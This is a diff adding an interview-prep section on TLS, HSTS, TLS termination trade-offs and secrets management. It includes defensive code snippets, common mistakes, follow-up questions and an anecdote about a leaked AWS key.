+> "Use HTTPS so data is encrypted in transit, and keep secrets in a `.env` file instead of hardcoding them."
+
+**Score: 3 / 10 — Right instinct, but `.env` files get committed, and there's no mention of HSTS, TLS termination, or secret rotation**
+
+#### Senior Engineer Answer
+
+**What TLS actually gives you (and what it doesn't):**
+
+```text
+TLS provides:  confidentiality (encryption) + integrity (tamper detection)
+             + authentication of the SERVER (via the certificate chain)
+TLS does NOT: authenticate the CLIENT (unless mTLS), protect data at rest,
+             or help if the user is tricked onto an attacker's valid-cert domain
+```
+
+**HSTS — closing the first-request downgrade gap:**
+
+```javascript
+// Without HSTS, the first http:// request can be intercepted and downgraded (SSL strip)
+// before the redirect to https:// happens. HSTS tells the browser: ALWAYS use HTTPS for
+// this domain, for the next `maxAge` seconds — no plaintext request is ever sent again.
+app.use(helmet.hsts({
+  maxAge: 31536000,        // 1 year
+  includeSubDomains: true,
+  preload: true,           // eligible for the browser's hardcoded HSTS preload list
+}));
+```
+
+**Where TLS terminates — the trade-off that surprises people:**
+
+```text
+Client ──TLS──▶ Load Balancer / CDN ──?──▶ App servers
+                       (terminates TLS here)
+
+Edge termination:  simpler, offloads crypto from app; but LB→app hop is plaintext
+                   inside the VPC — fine only if the internal network is trusted.
+End-to-end (mTLS): re-encrypt LB→app; needed for zero-trust / regulated (PCI/HIPAA) traffic.
+```
+
+**Secrets — the leak that ends careers:**
+
+```javascript
+// WRONG — committed to git, lives in history FOREVER even after deletion
+const AWS_KEY = 'AKIA...';                 // hardcoded
+// .env committed to the repo is the same mistake with extra steps
+
+// BETTER — inject at runtime from a secrets manager, never touch disk in the repo
+const { SecretsManagerClient, GetSecretValueCommand } = require('@aws-sdk/client-secrets-manager');
+const secret = await client.send(new GetSecretValueCommand({ SecretId: 'prod/db' }));
+// Vault/AWS Secrets Manager/GCP Secret Manager support automatic rotation + audit logs
+```
+
+```bash
+# Prevent the leak at the source
+echo ".env" >> .gitignore
+git secrets --install && git secrets --register-aws   # pre-commit hook blocks key patterns
+# If a secret WAS committed: rotate it immediately (assume compromised), THEN scrub history.
+# Scrubbing history is NOT enough on its own — the key is already public the moment it's pushed.
+```
+
+**mTLS for service-to-service (zero-trust interior):**
+
+```text
+In a microservice mesh, each service presents a client certificate; peers verify it.
+Now a leaked API key isn't enough to call an internal service — you need a valid,
+short-lived, rotatable cert. A service mesh (Istio/Linkerd) automates issuance/rotation.
+```
+
+#### Trade-offs
+
+| Control | Advantage | Disadvantage (the real cost) |
+|---|---|---|
+| Edge TLS termination (CDN/LB) | Simple, crypto offloaded, cheap certs (ACM/Let's Encrypt), HTTP/2 & 3 at edge | LB→origin hop is plaintext — unacceptable for zero-trust/regulated without re-encryption |
+| End-to-end / mTLS | Encrypted all the way; authenticates *both* ends; zero-trust interior | Cert lifecycle management is real ops burden; without a mesh it's painful; added latency |
+| HSTS `preload` + `includeSubDomains` | Eliminates the downgrade window permanently | **Hard to undo** — a mistake (subdomain without HTTPS) locks users out until preload list updates (months) |
+| `.env` files | Trivial for local dev | Get committed by accident; no rotation, no audit, no access control — not for production |
+| Secrets manager (Vault/ASM) | Rotation, audit trail, fine-grained access, no secret on disk | Runtime dependency & latency; bootstrapping the *first* credential (the "secret-zero" problem) |
+| Client-side env vars (SPA) | — | There are **no** frontend secrets: anything in the JS bundle is public. API keys in a React `.env` are visible in DevTools |
+
+> **The trade-off to say out loud:** "Edge TLS termination is the pragmatic default — you get HTTPS cheaply and offload crypto — but it leaves the LB-to-origin hop in the clear, which is fine on a trusted VPC and unacceptable under a zero-trust or PCI/HIPAA mandate, where you pay the operational cost of mTLS. And HSTS preload is a one-way door: powerful, but a subdomain misconfiguration is painful to reverse, so you enable `includeSubDomains`/`preload` only once you're certain every subdomain is HTTPS."
+
+#### Common Mistakes
+
+**1. Putting a secret in a frontend environment variable:**
+
+```javascript
+// EXPOSED — REACT_APP_/NEXT_PUBLIC_ vars are embedded in the JS bundle, readable by anyone
+const stripeSecret = process.env.REACT_APP_STRIPE_SECRET; // visible in DevTools → Sources
+// Frontend gets PUBLISHABLE keys only; secret keys stay server-side, always.
+```
+
+**2. Thinking `git rm .env` fixes a committed secret:**
+
+```bash
+# The secret is still in git history AND already scraped by bots within seconds of a public push.
+# Correct order: (1) ROTATE the credential now, (2) then scrub history (filter-repo/BFG).
+```
+
+**3. TLS termination at the edge with a plaintext internal hop in an untrusted network:**
+
+```text
+"We have HTTPS" — but the LB→app traffic crosses a shared network in plaintext.
+An attacker on that network reads everything. Re-encrypt or use mTLS for the internal hop.
+```
+
+#### Follow-up Questions
+
+1. What is the exact attack HSTS prevents, and why can't a plain http→https redirect prevent it alone? *(SSL strip on the first plaintext request before the redirect)*
+2. What's the "secret-zero" / bootstrapping problem with a secrets manager, and how is it solved? *(instance IAM roles / workload identity — the platform vouches for the workload)*
+3. How does certificate pinning help and why did mobile largely abandon strict pinning? *(breakage on cert rotation; moved to CT + short-lived certs)*
+4. What does mTLS add over a shared API key for service-to-service auth? *(mutual authentication + short-lived, revocable, non-copyable credentials)*
+5. How do TLS 1.3's changes (0-RTT, fewer round trips) affect the security/performance trade-off? *(0-RTT risks replay for non-idempotent requests)*
+
+#### Real Production Example
+
+A startup (later Amazon-acquired) pushed a commit with an AWS access key in a `config.js` "temporarily." Within ~3 minutes, automated scrapers found it and spun up dozens of GPU instances for crypto mining, generating a ~$50k bill overnight. The engineer's `git rm` the next morning did nothing — the key had been live and public for hours, and remained in history.
+
+**Fix applied:** (1) Immediate key rotation via IAM (the only action that actually stops the bleeding), (2) all secrets moved to AWS Secrets Manager injected at runtime via instance IAM roles — no long-lived keys anywhere, (3) `git-secrets` pre-commit hooks + a CI scan (truffleHog/gitleaks) that fails the build on any key-shaped string, (4) AWS budget alerts so anomalous spend pages within minutes instead of surfacing on the monthly bill.
+
+#### Performance Considerations
+
+- TLS 1.3 cuts the handshake to one round trip (vs two in 1.2), materially reducing connection latency — always prefer 1.3
+- Edge termination offloads the CPU cost of the TLS handshake from your app servers to the CDN/LB — a real throughput win at scale
+- Secrets-manager fetches add latency at startup; cache the secret in memory for its rotation lifetime rather than fetching per request
+
+#### Scalability Considerations
+
+- Centralize TLS termination and cert renewal (ACM auto-renew, cert-manager in Kubernetes) so hundreds of services don't each manage certs — expiry is a top cause of outages
+- A service mesh (Istio/Linkerd) automates mTLS issuance/rotation across all services — the org-scale answer to "encrypt and authenticate every internal hop" without per-team effort
+- Secrets rotation must be zero-downtime at scale: apps re-read on a schedule or via a notification, so rotating a DB password doesn't require redeploying every consumer simultaneously
+
+> **Interviewer Note:** Knowing HTTPS-plus-HSTS and "don't commit secrets" is Senior baseline. Explaining what TLS does *not* protect, the edge-vs-mTLS termination trade-off, HSTS preload as a one-way door, the frontend-has-no-secrets rule, and rotate-before-scrub — through a leaked-key incident — is Staff/Principal signal.
+
+---
+
 ## Upcoming Questions
 
 ### JavaScript
@@ -2589,8 +3325,11 @@ Still upcoming:
 
 **Covered:** Production Deployment Architecture (Q24) · Caching Strategy (Q25) · Observability (Q26) · Resilience Patterns (Q27)
 
+### Web & Application Security
+
+**Covered:** Node/API Injection & JWT (Q23) · XSS (Q28) · CSRF & SameSite (Q29) · Auth: Sessions vs JWT / OAuth (Q30) · Authorization: RBAC/ABAC & IDOR (Q31) · TLS/HSTS & Secrets (Q32)
+
 Still upcoming:
 - EC2 / S3 / CloudFront specifics
-- XSS / CSRF deep dive
 - Design Patterns
 - Leadership
